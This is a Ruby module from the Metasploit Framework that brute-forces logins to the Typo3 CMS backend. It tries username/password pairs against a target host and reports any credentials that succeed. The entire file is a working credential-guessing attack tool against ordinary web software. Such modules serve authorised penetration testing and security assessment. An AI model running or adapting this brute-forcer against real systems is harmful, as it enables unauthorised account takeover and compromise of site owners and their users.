##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::HTTP::Typo3
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
        'Name'		   => 'Typo3 Login Bruteforcer',
        'Description'	=> 'This module attempts to bruteforce Typo3 logins.',
        'References'  =>
            [
                [ 'URL', 'http://typo3.org/' ]
            ],
        'Author'		 => [ 'Christian Mehlmauer <FireFart[at]gmail.com>' ],
        'License'		=> MSF_LICENSE
    )
  end

  def run_host(ip)
    print_status("Trying to bruteforce logins on #{ip}")

    res = send_request_cgi({
      'method'  => 'GET',
      'uri'	 => target_uri
    })

    unless res
      print_error("#{ip} seems to be down")
      return
    end

    each_user_pass { |user, pass|
      enum_user(user,pass)
    }
  end

  def enum_user(user, pass)
    vprint_status("#{peer} - Trying username:'#{user}' password: '#{pass}'")
    cookie = typo3_backend_login(user, pass)
    if cookie
      print_good("#{peer} - Successful login '#{user}' password: '#{pass}'")
      report_auth_info(
          :host   => rhost,
          :proto => 'http',
          :sname  => 'typo3',
          :user   => user,
          :pass   => pass,
          :target_host => rhost,
          :target_port => rport
      )
      return :next_user
    else
      vprint_error("#{peer} - failed to login as '#{user}' password: '#{pass}'")
      return
    end
  end
end
